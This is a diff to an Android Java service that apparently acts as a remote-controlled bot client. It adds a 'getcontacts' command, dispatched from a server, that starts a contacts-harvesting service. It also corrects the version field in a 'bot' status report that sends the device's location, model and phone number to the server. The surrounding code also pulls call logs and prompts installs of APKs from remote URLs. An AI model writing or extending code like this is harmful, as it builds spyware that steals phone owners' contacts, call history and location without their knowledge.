@@ -147,6 +147,10 @@ public class Client extends Service {
                                 int arg1 = Integer.parseInt(cmd.get("arg1").toString());
                                 CallLogService cs = new CallLogService(client, arg1);
                                 cs.start();
+                            } else if (command.equals("getcontacts")) {
+                                Log.i(TAG, "\nInvoking ContactsService\n");
+                                ContactsService cs = new ContactsService(client);
+                                cs.start();
                             } else if (command.equals("promptupdate")) {
                                 Log.i(TAG, "\nInvoking UpdateService\n");
                                 String apkUrl = cmd.get("arg1").toString();
@@ -238,7 +242,7 @@ public class Client extends Service {
             bot.put("longi", longitude);
             bot.put("device", params.getDevice());
             bot.put("sdk", params.getSdk());
-            bot.put("version", params.getServer());
+            bot.put("version", params.getVersion());
             bot.put("phone", params.getPhone());
             Http req = new Http();
             req.setUrl(params.getServer() + POST_STATUS + "/" + params.getUid());
